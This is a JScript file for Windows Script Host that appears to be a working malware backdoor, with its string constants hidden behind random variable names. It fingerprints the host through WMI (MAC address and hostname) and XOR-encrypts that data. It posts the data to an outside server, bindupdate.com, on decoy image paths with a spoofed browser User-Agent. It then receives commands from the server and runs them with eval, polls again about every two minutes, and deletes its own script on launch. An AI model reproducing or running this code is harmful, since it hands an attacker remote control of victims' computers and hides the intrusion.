var ilurjolohm = "string";
var uhywimwofko = "User-Agent";
var hduzmalpomaq = "encrypt";
var cuxtusyxa = "POST";
var oswepogyg = "Content-Type";
var ijybynzuhb = "create_image";
var udwelysvusudf = "request";
var yzqopuhquqf = "https://bindupdate.com/";
var mykipfopwod = "_";
var nywwejfodupu = "";
var asybsadyml = "";
var jxatonahythy = "decrypt";
var xufuzqytfani = "group=zsoc._2205&rt=0&secret=fghedf43dsSFvm03&time=120000&uid=";
var mixohemo = "z";
var ofagepcablar = "Unknown";
var furfuvwuces = "&";
var awivegobd = "_";
var bimivqano = "&id=";
var fwocfisypfe = "application/x-www-form-urlencoded";
var ymcokwaxvihew = "get_image";
var ymjozrykigxu = "MSXML2.ServerXMLHTTP";
var idjuhruswiv = "content";
var awmydsywyhi = "decrypt";
var rpeclydyzjovi = "show_jpg";
var wqydixispo = "encrypt";
var apxopobzecxa = "images";
var idluzguqqykux = "WScript.Shell";
var qkafuzposy = "cdn";
var muxhypvuxmyrn = "Scripting.FileSystemObject";
var ijvilybzylde = "";
var yvdimugupuqf = "fetch";
var otpupvazlysgugs = "string";
var atvihufepce = "encrypt";
var mhukbudsawim = "/";
var oqabkiqyv = "POST";
var akrobinum = "?request=page";
var jofmyhubxemde = "show_png";
var ekitubecip = "kywzewfixu=";
var darovykqu = "image";
var ebahpyloqu = "create_logo";
var pniqexqipdixy = "winmgmts:root/CIMV2";
var fdoxwirunpu = "";
var amifadevga = "?request=content&id=";
var cyhjiryda = "request";
var ezredenyd = "no";
var ekoclyjiwi = "";
var ytynqicafuwb = "%APPDATA%";
var hytojbixduq = "show_ico";
var attesdoquxe = "action=get_command";
var owzafamuqj = "";
var ijyhnavaq = "no";

function id() {
    var lrequest = wmi.ExecQuery("select * from Win32_NetworkAdapterConfiguration where ipenabled = true");
    var lItems = new Enumerator(lrequest);
    for (; !lItems.atEnd(); lItems.moveNext()) {
        var mac = lItems.item().macaddress;
        var dns_hostname = lItems.item().DNSHostName;
        if (typeof mac === ilurjolohm && mac.length > 1) {
            if (typeof dns_hostname !== ilurjolohm && dns_hostname.length < 1) {
                dns_hostname = ofagepcablar;
            } else {
                for (var i = 0; i < dns_hostname.length; i++) {
                    if (dns_hostname.charAt(i) > mixohemo) {
                        dns_hostname = dns_hostname.substr(0, i) + mykipfopwod + dns_hostname.substr(i + 1);
                    }
                }
            }
            return mac + mykipfopwod + dns_hostname;
        }
    }
}

function crypt_controller(type, request) {
    var encryption_key = ekoclyjiwi;
    if (type === awmydsywyhi) {
        request = unescape(request);
        var request_split = request.split(")*(");
        request = request_split[0];
        encryption_key = request_split[1].split(ekoclyjiwi);
    } else {
        encryption_key = (Math.floor(Math.random() * 9000) + 1000).toString().split(ekoclyjiwi);
        request = unescape(encodeURIComponent(request));
    }
    var output = new Array(request.length);
    for (var i = 0; i < request.length; i++) {
        var charCode = request.charCodeAt(i) ^ encryption_key[i % encryption_key.length].charCodeAt(0);
        output[i] = String.fromCharCode(charCode);
    }
    var result_string = output.join(ekoclyjiwi);
    if (type === atvihufepce) {
        result_string = result_string + ")*(" + encryption_key.join(ekoclyjiwi);
        result_string = escape(result_string);
    }
    return result_string;
}

function get_path() {
    var pathes = [apxopobzecxa, darovykqu, idjuhruswiv, yvdimugupuqf, qkafuzposy];
    var files = [ebahpyloqu, ymcokwaxvihew, ijybynzuhb, hytojbixduq, jofmyhubxemde, rpeclydyzjovi];
    var path = pathes[Math.floor(Math.random() * pathes.length)] + mhukbudsawim + files[Math.floor(Math.random() * files.length)];
    return yzqopuhquqf + path;
}

function send_data(type, data, crypt) {
    try {
        var http_object = new ActiveXObject(ymjozrykigxu);
        if (type === udwelysvusudf) {
            http_object.open(oqabkiqyv, get_path() + akrobinum, false);
            data = ekitubecip + crypt_controller(atvihufepce, xufuzqytfani + uniq_id + bimivqano + id() + furfuvwuces + data);
        } else {
            http_object.open(oqabkiqyv, get_path() + amifadevga + uniq_id, false);
            if (crypt) {
                data = crypt_controller(atvihufepce, data);
            }
        }
        http_object.setRequestHeader(uhywimwofko, "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:58.0) Gecko/20100101 Firefox/50.0");
        http_object.setRequestHeader(oswepogyg, fwocfisypfe);
        http_object.setOption(2, 13056);
        http_object.send(data);
        return http_object.responseText;
    } catch (e) {
        return ijyhnavaq;
    }
}

function main() {
    var ncommand = ekoclyjiwi;
    ncommand = send_data(udwelysvusudf, attesdoquxe, true);
    if (ncommand !== ijyhnavaq) {
        try {
            eval(crypt_controller(awmydsywyhi, ncommand));
        } catch (e) {}
    }
    var random_knock = 120000 + (Math.floor(Math.random() * 16001) - 5000);
    WScript.Sleep(random_knock);
    main();
}
var first = false;
var shell = new ActiveXObject(idluzguqqykux);
var fso = new ActiveXObject(muxhypvuxmyrn);
var wmi = GetObject(pniqexqipdixy);
var uniq_id = new Date().getUTCMilliseconds();
var app_path = shell.expandEnvironmentStrings(ytynqicafuwb);
if (fso.GetFolder(app_path).Type.length > 5) {
    fso.deleteFile(WScript.ScriptFullName);
    try {
        // WScript.Sleep(120000);
        main();
    } catch (e) {
        main();
    }
}